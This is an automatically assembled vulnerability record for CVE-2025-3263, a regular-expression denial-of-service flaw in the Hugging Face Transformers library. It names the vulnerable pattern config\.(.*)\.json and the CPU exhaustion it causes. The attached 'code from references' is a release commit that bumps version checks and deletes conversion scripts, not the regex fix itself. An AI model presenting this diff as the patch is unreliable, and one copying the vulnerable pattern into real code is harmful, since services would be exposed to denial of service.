 delete mode 100644 src/transformers/models/megatron_gpt2/convert_megatron_gpt2_checkpoint.py
 delete mode 100644 src/transformers/models/mimi/convert_mimi_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mistral/convert_mistral_weights_to_hf.py
 delete mode 100644 src/transformers/models/mistral3/convert_mistral3_weights_to_hf.py
 delete mode 100644 src/transformers/models/mixtral/convert_mixtral_weights_to_hf.py
 delete mode 100644 src/transformers/models/mllama/convert_mllama_weights_to_hf.py
 delete mode 100644 src/transformers/models/mluke/convert_mluke_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilebert/convert_mobilebert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilenet_v1/convert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilenet_v2/convert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilevit/convert_mlcvnets_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py
 delete mode 100644 src/transformers/models/moonshine/convert_usefulsensors_to_hf.py
 delete mode 100644 src/transformers/models/moshi/convert_moshi_transformers.py
 delete mode 100644 src/transformers/models/mra/convert_mra_pytorch_to_pytorch.py
 delete mode 100644 src/transformers/models/musicgen/convert_musicgen_transformers.py
 delete mode 100644 src/transformers/models/musicgen_melody/convert_musicgen_melody_transformers.py
 delete mode 100644 src/transformers/models/myt5/convert_myt5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/nemotron/convert_nemotron_nemo_to_hf.py
 delete mode 100644 src/transformers/models/nllb_moe/convert_nllb_moe_sharded_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/nougat/convert_nougat_to_hf.py
 delete mode 100644 src/transformers/models/nystromformer/convert_nystromformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/olmo/convert_olmo_weights_to_hf.py
 delete mode 100644 src/transformers/models/olmo2/convert_olmo2_weights_to_hf.py
 delete mode 100644 src/transformers/models/olmoe/convert_olmoe_weights_to_hf.py
 delete mode 100644 src/transformers/models/omdet_turbo/convert_omdet_turbo_to_hf.py
 delete mode 100644 src/transformers/models/oneformer/convert_to_hf_oneformer.py
 delete mode 100755 src/transformers/models/openai/convert_openai_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/opt/convert_opt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/owlv2/convert_owlv2_to_hf.py
 delete mode 100644 src/transformers/models/owlvit/convert_owlvit_original_flax_to_hf.py
 delete mode 100644 src/transformers/models/paligemma/convert_paligemma2_weights_to_hf.py
 delete mode 100644 src/transformers/models/paligemma/convert_paligemma_weights_to_hf.py
 delete mode 100644 src/transformers/models/pegasus/convert_pegasus_tf_to_pytorch.py
 delete mode 100644 src/transformers/models/perceiver/convert_perceiver_haiku_to_pytorch.py
 delete mode 100644 src/transformers/models/persimmon/convert_persimmon_weights_to_hf.py
 delete mode 100644 src/transformers/models/phi/convert_phi_weights_to_hf.py
 delete mode 100644 src/transformers/models/phi4_multimodal/convert_phi4_multimodal_weights_to_hf.py
 delete mode 100644 src/transformers/models/pix2struct/convert_pix2struct_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/pixtral/convert_pixtral_weights_to_hf.py
 delete mode 100644 src/transformers/models/plbart/convert_plbart_original_checkpoint_to_torch.py
 delete mode 100644 src/transformers/models/poolformer/convert_poolformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/pop2piano/convert_pop2piano_weights_to_hf.py
 delete mode 100644 src/transformers/models/prompt_depth_anything/convert_prompt_depth_anything_to_hf.py
 delete mode 100644 src/transformers/models/prophetnet/convert_prophetnet_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/pvt/convert_pvt_to_pytorch.py
 delete mode 100644 src/transformers/models/pvt_v2/convert_pvt_v2_to_pytorch.py
 delete mode 100644 src/transformers/models/recurrent_gemma/convert_recurrent_gemma_to_hf.py
 delete mode 100755 src/transformers/models/reformer/convert_reformer_trax_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/regnet/convert_regnet_seer_10b_to_pytorch.py
 delete mode 100644 src/transformers/models/regnet/convert_regnet_to_pytorch.py
 delete mode 100755 src/transformers/models/rembert/convert_rembert_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/resnet/convert_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/roberta/convert_roberta_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/roberta_prelayernorm/convert_roberta_prelayernorm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/roformer/convert_roformer_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/rt_detr/convert_rt_detr_original_pytorch_checkpoint_to_hf.py
 delete mode 100644 src/transformers/models/rt_detr_v2/convert_rt_detr_v2_weights_to_hf.py
 delete mode 100644 src/transformers/models/rwkv/convert_rwkv_checkpoint_to_hf.py
 delete mode 100644 src/transformers/models/sam/convert_sam_to_hf.py
 delete mode 100644 src/transformers/models/seamless_m4t/convert_fairseq2_to_hf.py
 delete mode 100644 src/transformers/models/seamless_m4t_v2/convert_fairseq2_to_hf.py
 delete mode 100644 src/transformers/models/segformer/convert_segformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/seggpt/convert_seggpt_to_hf.py
 delete mode 100644 src/transformers/models/sew/convert_sew_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/sew_d/convert_sew_d_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/shieldgemma2/convert_shieldgemma2_weights_orbax_to_hf.py
 delete mode 100644 src/transformers/models/siglip/convert_siglip_to_hf.py
 delete mode 100644 src/transformers/models/siglip2/convert_siglip2_to_hf.py
 delete mode 100644 src/transformers/models/speech_encoder_decoder/convert_mbart_wav2vec2_seq2seq_original_to_pytorch.py
 delete mode 100644 src/transformers/models/speech_encoder_decoder/convert_speech_to_text_wav2vec2_seq2seq_original_to_pytorch.py
 delete mode 100644 src/transformers/models/speech_to_text/convert_s2t_fairseq_to_tfms.py
 delete mode 100644 src/transformers/models/speecht5/convert_hifigan.py
 delete mode 100644 src/transformers/models/speecht5/convert_speecht5_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/superglue/convert_superglue_to_hf.py
 delete mode 100644 src/transformers/models/superpoint/convert_superpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/swiftformer/convert_swiftformer_original_to_hf.py
 delete mode 100644 src/transformers/models/swin/convert_swin_simmim_to_pytorch.py
 delete mode 100644 src/transformers/models/swin/convert_swin_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/swin2sr/convert_swin2sr_original_to_pytorch.py
 delete mode 100644 src/transformers/models/swinv2/convert_swinv2_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/switch_transformers/convert_big_switch.py
 delete mode 100644 src/transformers/models/switch_transformers/convert_switch_transformers_original_flax_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/t5/convert_t5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/t5/convert_t5x_checkpoint_to_flax.py
 delete mode 100755 src/transformers/models/t5/convert_t5x_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/table_transformer/convert_table_transformer_to_hf.py
 delete mode 100644 src/transformers/models/table_transformer/convert_table_transformer_to_hf_no_timm.py
 delete mode 100644 src/transformers/models/tapas/convert_tapas_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/textnet/convert_textnet_to_hf.py
 delete mode 100644 src/transformers/models/timesformer/convert_timesformer_to_pytorch.py
 delete mode 100644 src/transformers/models/trocr/convert_trocr_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/udop/convert_udop_to_hf.py
 delete mode 100644 src/transformers/models/umt5/convert_umt5_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech/convert_unispeech_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech_sat/convert_unispeech_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech_sat/convert_unispeech_sat_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/univnet/convert_univnet.py
 delete mode 100644 src/transformers/models/upernet/convert_convnext_upernet_to_pytorch.py
 delete mode 100644 src/transformers/models/upernet/convert_swin_upernet_to_pytorch.py
 delete mode 100644 src/transformers/models/video_llava/convert_video_llava_weights_to_hf.py
 delete mode 100644 src/transformers/models/videomae/convert_videomae_to_pytorch.py
 delete mode 100644 src/transformers/models/vilt/convert_vilt_original_to_pytorch.py
 delete mode 100644 src/transformers/models/vipllava/convert_vipllava_weights_to_hf.py
 delete mode 100644 src/transformers/models/visual_bert/convert_visual_bert_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/vit/convert_dino_to_pytorch.py
 delete mode 100644 src/transformers/models/vit/convert_vit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/vit_mae/convert_vit_mae_to_pytorch.py
 delete mode 100644 src/transformers/models/vit_msn/convert_msn_to_pytorch.py
 delete mode 100644 src/transformers/models/vitmatte/convert_vitmatte_to_hf.py
 delete mode 100644 src/transformers/models/vitpose/convert_vitpose_to_hf.py
 delete mode 100644 src/transformers/models/vits/convert_original_checkpoint.py
 delete mode 100644 src/transformers/models/vivit/convert_vivit_flax_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2/convert_wav2vec2_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2/convert_wav2vec2_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2_bert/convert_wav2vec2_seamless_checkpoint.py
 delete mode 100644 src/transformers/models/wav2vec2_conformer/convert_wav2vec2_conformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wavlm/convert_wavlm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wavlm/convert_wavlm_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/whisper/convert_openai_to_hf.py
 delete mode 100644 src/transformers/models/x_clip/convert_x_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/xglm/convert_xglm_original_ckpt_to_trfms.py
 delete mode 100755 src/transformers/models/xlm/convert_xlm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/xlm_roberta_xl/convert_xlm_roberta_xl_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/xlnet/convert_xlnet_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/xmod/convert_xmod_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/yolos/convert_yolos_to_pytorch.py
 delete mode 100644 src/transformers/models/yoso/convert_yoso_pytorch_to_pytorch.py
 delete mode 100644 src/transformers/models/zoedepth/convert_zoedepth_to_hf.py

diff --git a/examples/flax/question-answering/run_qa.py b/examples/flax/question-answering/run_qa.py
index c42911f6638d..63d9c918cc44 100644
--- a/examples/flax/question-answering/run_qa.py
+++ b/examples/flax/question-answering/run_qa.py
@@ -61,7 +61,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 Array = Any
 Dataset = datasets.arrow_dataset.Dataset
diff --git a/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py b/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
index 6028f7408bad..38258ecec303 100644
--- a/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
+++ b/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
@@ -60,7 +60,7 @@
 
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risk.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.14.0", "To fix: pip install -r examples/flax/speech-recognition/requirements.txt")
 
diff --git a/examples/flax/text-classification/run_flax_glue.py b/examples/flax/text-classification/run_flax_glue.py
index 522a601551da..a3d952a1a2bb 100755
--- a/examples/flax/text-classification/run_flax_glue.py
+++ b/examples/flax/text-classification/run_flax_glue.py
@@ -56,7 +56,7 @@
 
 logger = logging.getLogger(__name__)
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 Array = Any
 Dataset = datasets.arrow_dataset.Dataset
diff --git a/examples/flax/token-classification/run_flax_ner.py b/examples/flax/token-classification/run_flax_ner.py
index 5c8fa77cbb93..4b232115c0d4 100644
--- a/examples/flax/token-classification/run_flax_ner.py
+++ b/examples/flax/token-classification/run_flax_ner.py
@@ -57,7 +57,7 @@
 
 logger = logging.getLogger(__name__)
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/token-classification/requirements.txt")
 
diff --git a/examples/pytorch/audio-classification/run_audio_classification.py b/examples/pytorch/audio-classification/run_audio_classification.py
index 5d1e0390f61d..89915308a1e0 100644
--- a/examples/pytorch/audio-classification/run_audio_classification.py
+++ b/examples/pytorch/audio-classification/run_audio_classification.py
@@ -45,7 +45,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.14.0", "To fix: pip install -r examples/pytorch/audio-classification/requirements.txt")
 
diff --git a/examples/pytorch/contrastive-image-text/run_clip.py b/examples/pytorch/contrastive-image-text/run_clip.py
index 232c58c417a1..bdd803e646b4 100644
--- a/examples/pytorch/contrastive-image-text/run_clip.py
+++ b/examples/pytorch/contrastive-image-text/run_clip.py
@@ -54,7 +54,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/contrastive-image-text/requirements.txt")
 
diff --git a/examples/pytorch/image-classification/run_image_classification.py b/examples/pytorch/image-classification/run_image_classification.py
index c941465babe0..c0d2001b9bea 100755
--- a/examples/pytorch/image-classification/run_image_classification.py
+++ b/examples/pytorch/image-classification/run_image_classification.py
@@ -57,7 +57,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.14.0", "To fix: pip install -r examples/pytorch/image-classification/requirements.txt")
 
diff --git a/examples/pytorch/image-classification/run_image_classification_no_trainer.py b/examples/pytorch/image-classification/run_image_classification_no_trainer.py
index 564588a52b8b..d837440405ba 100644
--- a/examples/pytorch/image-classification/run_image_classification_no_trainer.py
+++ b/examples/pytorch/image-classification/run_image_classification_no_trainer.py
@@ -49,7 +49,7 @@
 
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 logger = get_logger(__name__)
 
diff --git a/examples/pytorch/image-pretraining/run_mae.py b/examples/pytorch/image-pretraining/run_mae.py
index fdffbda0beea..208c43c2b4e6 100644
--- a/examples/pytorch/image-pretraining/run_mae.py
+++ b/examples/pytorch/image-pretraining/run_mae.py
@@ -43,7 +43,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/image-pretraining/run_mim.py b/examples/pytorch/image-pretraining/run_mim.py
index 3f497252d3a6..c0ae1cec1c1d 100644
--- a/examples/pytorch/image-pretraining/run_mim.py
+++ b/examples/pytorch/image-pretraining/run_mim.py
@@ -48,7 +48,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/image-pretraining/run_mim_no_trainer.py b/examples/pytorch/image-pretraining/run_mim_no_trainer.py
index 5935ce438478..c60787764c24 100644
--- a/examples/pytorch/image-pretraining/run_mim_no_trainer.py
+++ b/examples/pytorch/image-pretraining/run_mim_no_trainer.py
@@ -53,7 +53,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/instance-segmentation/run_instance_segmentation.py b/examples/pytorch/instance-segmentation/run_instance_segmentation.py
index 6229c6f36583..6cb6859fd976 100644
--- a/examples/pytorch/instance-segmentation/run_instance_segmentation.py
+++ b/examples/pytorch/instance-segmentation/run_instance_segmentation.py
@@ -46,7 +46,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.0.0", "To fix: pip install -r examples/pytorch/inst
... [truncated]

================================================================================


CVE ID: CVE-2025-3263
Published: 2025-07-07T10:15:27.350
Modified: 2025-08-07T01:03:17.990
CVSS Score: 5.3 (MEDIUM) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-1333: CWE-1333

Description:
A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically in the `get_configuration_file()` function within the `transformers.configuration_utils` module. The affected version is 4.49.0, and the issue is resolved in version 4.51.0. The vulnerability arises from the use of a regular expression pattern `config\.(.*)\.json` that can be exploited to cause excessive CPU consumption through crafted input strings, leading to catastrophic backtracking. This can result in model serving disruption, resource exhaustion, and increased latency in applications using the library.

References (2):
  1. https://github.com/huggingface/transformers/commit/0720e206c6ba28887e4d60ef60a6a089f6c1cc76 [Patch]
  2. https://huntr.com/bounties/c7a69150-54f8-4e81-8094-791e7a2a0f29 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/huggingface/transformers/commit/0720e206c6ba28887e4d60ef60a6a089f6c1cc76 ---
From 0720e206c6ba28887e4d60ef60a6a089f6c1cc76 Mon Sep 17 00:00:00 2001
From: Lysandre <hi@lysand.re>
Date: Sat, 5 Apr 2025 22:03:17 +0200
Subject: [PATCH] Release: v4.51.0

---
 examples/flax/question-answering/run_qa.py    |    2 +-
 .../run_flax_speech_recognition_seq2seq.py    |    2 +-
 .../flax/text-classification/run_flax_glue.py |    2 +-
 .../flax/token-classification/run_flax_ner.py |    2 +-
 .../run_audio_classification.py               |    2 +-
 .../contrastive-image-text/run_clip.py        |    2 +-
 .../run_image_classification.py               |    2 +-
 .../run_image_classification_no_trainer.py    |    2 +-
 examples/pytorch/image-pretraining/run_mae.py |    2 +-
 examples/pytorch/image-pretraining/run_mim.py |    2 +-
 .../image-pretraining/run_mim_no_trainer.py   |    2 +-
 .../run_instance_segmentation.py              |    2 +-
 .../run_instance_segmentation_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_clm.py |    2 +-
 .../language-modeling/run_clm_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_fim.py |    2 +-
 .../language-modeling/run_fim_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_mlm.py |    2 +-
 .../language-modeling/run_mlm_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_plm.py |    2 +-
 examples/pytorch/multiple-choice/run_swag.py  |    2 +-
 .../multiple-choice/run_swag_no_trainer.py    |    2 +-
 .../object-detection/run_object_detection.py  |    2 +-
 .../run_object_detection_no_trainer.py        |    2 +-
 examples/pytorch/question-answering/run_qa.py |    2 +-
 .../question-answering/run_qa_beam_search.py  |    2 +-
 .../run_qa_beam_search_no_trainer.py          |    2 +-
 .../question-answering/run_qa_no_trainer.py   |    2 +-
 .../question-answering/run_seq2seq_qa.py      |    2 +-
 .../run_semantic_segmentation.py              |    2 +-
 .../run_semantic_segmentation_no_trainer.py   |    2 +-
 .../run_speech_recognition_ctc.py             |    2 +-
 .../run_speech_recognition_ctc_adapter.py     |    2 +-
 .../run_speech_recognition_seq2seq.py         |    2 +-
 .../summarization/run_summarization.py        |    2 +-
 .../run_summarization_no_trainer.py           |    2 +-
 .../text-classification/run_classification.py |    2 +-
 .../pytorch/text-classification/run_glue.py   |    2 +-
 .../run_glue_no_trainer.py                    |    2 +-
 .../pytorch/text-classification/run_xnli.py   |    2 +-
 .../pytorch/token-classification/run_ner.py   |    2 +-
 .../run_ner_no_trainer.py                     |    2 +-
 .../pytorch/translation/run_translation.py    |    2 +-
 .../translation/run_translation_no_trainer.py |    2 +-
 .../contrastive-image-text/run_clip.py        |    2 +-
 .../run_image_classification.py               |    2 +-
 .../tensorflow/multiple-choice/run_swag.py    |    2 +-
 .../tensorflow/question-answering/run_qa.py   |    2 +-
 .../summarization/run_summarization.py        |    2 +-
 .../text-classification/run_glue.py           |    2 +-
 .../tensorflow/translation/run_translation.py |    2 +-
 setup.py                                      |    2 +-
 src/transformers/__init__.py                  |    2 +-
 ...lbert_original_tf_checkpoint_to_pytorch.py |   62 -
 .../models/align/convert_align_tf_to_hf.py    |  389 -----
 .../models/aria/convert_aria_weights_to_hf.py |  162 --
 ...trogram_transformer_original_to_pytorch.py |  279 ----
 .../bamba/convert_mamba_ssm_checkpoint.py     |  273 ----
 .../models/bark/convert_suno_to_hf.py         |  263 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  156 --
 .../beit/convert_beit_unilm_to_pytorch.py     |  373 -----
 ...bert_original_tf2_checkpoint_to_pytorch.py |  246 ---
 ..._bert_original_tf_checkpoint_to_pytorch.py |   62 -
 ..._bert_pytorch_checkpoint_to_original_tf.py |  112 --
 ...ping_original_tf2_checkpoint_to_pytorch.py |  188 ---
 ...gbird_original_tf_checkpoint_to_pytorch.py |   69 -
 .../convert_bigbird_pegasus_tf_to_pytorch.py  |  170 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  292 ----
 .../models/bit/convert_bit_to_pytorch.py      |  177 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  114 --
 .../convert_blip_original_pytorch_to_hf.py    |  191 ---
 .../convert_blip_2_original_to_pytorch.py     |  390 -----
 ...rt_bloom_original_checkpoint_to_pytorch.py |  254 ----
 .../models/bros/convert_bros_to_pytorch.py    |  145 --
 ..._byt5_original_tf_checkpoint_to_pytorch.py |   59 -
 ...anine_original_tf_checkpoint_to_pytorch.py |   65 -
 .../convert_chameleon_weights_to_hf.py        |  476 ------
 ...ert_chinese_clip_original_pytorch_to_hf.py |  134 --
 .../convert_clap_original_pytorch_to_hf.py    |  133 --
 .../convert_clip_original_pytorch_to_hf.py    |  156 --
 .../convert_clipseg_original_pytorch_to_hf.py |  264 ----
 .../models/clvp/convert_clvp_to_hf.py         |  234 ---
 .../colpali/convert_colpali_weights_to_hf.py  |  214 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  324 ----
 ...ginal_tf1_checkpoint_to_pytorch_and_tf2.py |   57 -
 .../convnext/convert_convnext_to_pytorch.py   |  242 ---
 .../convert_convnextv2_to_pytorch.py          |  286 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  362 -----
 ..._original_pytorch_checkpoint_to_pytorch.py |  233 ---
 .../models/dac/convert_dac_checkpoint.py      |  261 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  285 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  207 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  374 -----
 .../convert_deformable_detr_to_pytorch.py     |  236 ---
 .../deit/convert_deit_timm_to_pytorch.py      |  218 ---
 ...original_gluonnlp_checkpoint_to_pytorch.py |  318 ----
 .../deta/convert_deta_resnet_to_pytorch.py    |  319 ----
 .../deta/convert_deta_swin_to_pytorch.py      |  326 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  252 ----
 ...convert_gptsan_tf_checkpoint_to_pytorch.py |  181 ---
 .../deprecated/jukebox/convert_jukebox.py     |  279 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  292 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |   70 -
 ...fo_xl_original_tf_checkpoint_to_pytorch.py |  121 --
 .../deprecated/van/convert_van_to_pytorch.py  |  290 ----
 .../convert_vit_hybrid_timm_to_pytorch.py     |  282 ----
 .../convert_depth_anything_to_hf.py           |  368 -----
 .../convert_distill_any_depth_to_hf.py        |  246 ---
 .../convert_depth_pro_weights_to_hf.py        |  254 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  277 ----
 .../models/detr/convert_detr_to_pytorch.py    |  385 -----
 ..._original_pytorch_checkpoint_to_pytorch.py |   46 -
 .../models/dinov2/convert_dinov2_to_hf.py     |  285 ----
 .../convert_dinov2_with_registers_to_hf.py    |  291 ----
 .../dit/convert_dit_unilm_to_pytorch.py       |  230 ---
 .../models/donut/convert_donut_to_pytorch.py  |  234 ---
 ...vert_dpr_original_checkpoint_to_pytorch.py |  143 --
 .../models/dpt/convert_dinov2_depth_to_hf.py  |  383 -----
 .../models/dpt/convert_dpt_beit_to_hf.py      |  305 ----
 .../dpt/convert_dpt_hybrid_to_pytorch.py      |  315 ----
 .../models/dpt/convert_dpt_swinv2_to_hf.py    |  321 ----
 .../models/dpt/convert_dpt_to_pytorch.py      |  285 ----
 .../convert_efficientnet_to_pytorch.py        |  339 -----
 ...ectra_original_tf_checkpoint_to_pytorch.py |   79 -
 .../models/emu3/convert_emu3_weights_to_hf.py |  448 ------
 .../convert_encodec_checkpoint_to_pytorch.py  |  365 -----
 src/transformers/models/esm/convert_esm.py    |  399 -----
 .../falcon/convert_custom_code_checkpoint.py  |   74 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  210 ---
 .../fastspeech2_conformer/convert_hifigan.py  |  134 --
 .../convert_model_with_hifigan.py             |  102 --
 .../flava/convert_dalle_to_flava_codebook.py  |  102 --
 .../convert_flava_original_pytorch_to_hf.py   |   99 --
 ...net_original_flax_checkpoint_to_pytorch.py |  156 --
 .../focalnet/convert_focalnet_to_hf_format.py |  237 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  280 ----
 ...unnel_original_tf_checkpoint_to_pytorch.py |   67 -
 .../fuyu/convert_fuyu_model_weights_to_hf.py  |  134 --
 .../gemma/convert_gemma_weights_to_hf.py      |  206 ---
 .../gemma2/convert_gemma2_weights_to_hf.py    |  239 ---
 .../convert_gemma3_weights_orbax_to_hf.py     |  589 --------
 .../models/git/convert_git_to_pytorch.py      |  448 ------
 .../models/glm/convert_glm_weights_to_hf.py   |  195 ---
 .../models/glpn/convert_glpn_to_pytorch.py    |  218 ---
 .../convert_got_ocr2_weights_to_hf.py         |  274 ----
 ..._gpt2_original_tf_checkpoint_to_pytorch.py |   68 -
 .../convert_gpt_neo_mesh_tf_to_pytorch.py     |   71 -
 .../gpt_sw3/convert_megatron_to_pytorch.py    |  197 ---
 .../convert_grounding_dino_to_hf.py           |  491 ------
 .../groupvit/convert_groupvit_nvlab_to_hf.py  |  217 ---
 .../models/hiera/convert_hiera_to_hf.py       |  369 -----
 ...rt_original_s3prl_checkpoint_to_pytorch.py |  222 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  261 ----
 ...rt_original_s3prl_checkpoint_to_pytorch.py |   68 -
 .../convert_idefics2_weights_to_hf.py         |  185 ---
 .../convert_idefics3_weights_to_hf.py         |  214 ---
 .../models/ijepa/convert_ijepa_to_hf.py       |  267 ----
 ...onvert_imagegpt_original_tf2_to_pytorch.py |   71 -
 ...onvert_instructblip_original_to_pytorch.py |  303 ----
 ...t_instructblipvideo_original_to_pytorch.py |  305 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 .../levit/convert_levit_timm_to_pytorch.py    |  181 ---
 .../llama/convert_llama_weights_to_hf.py      |  601 --------
 .../llama4/convert_llama4_weights_to_hf.py    |  736 ---------
 .../llava/convert_llava_weights_to_hf.py      |  204 ---
 .../convert_llava_next_weights_to_hf.py       |  397 -----
 .../convert_llava_next_video_weights_to_hf.py |  276 ----
 .../convert_llava_onevision_weights_to_hf.py  |  388 -----
 ...r_original_pytorch_lightning_to_pytorch.py |   85 --
 .../convert_longt5x_checkpoint_to_flax.py     |  215 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  170 ---
 ...xmert_original_tf_checkpoint_to_pytorch.py |   59 -
 ...t_m2m100_original_checkpoint_to_pytorch.py |   85 --
 ...convert_mamba_ssm_checkpoint_to_pytorch.py |  153 --
 ...onvert_mamba2_ssm_checkpoint_to_pytorch.py |  193 ---
 .../convert_marian_tatoeba_to_pytorch.py      | 1327 -----------------
 .../marian/convert_marian_to_pytorch.py       |  717 ---------
 ..._original_pytorch_checkpoint_to_pytorch.py | 1019 -------------
 ..._original_pytorch_checkpoint_to_pytorch.py |  731 ---------
 .../convert_maskformer_resnet_to_pytorch.py   |  390 -----
 .../convert_maskformer_swin_to_pytorch.py     |  333 -----
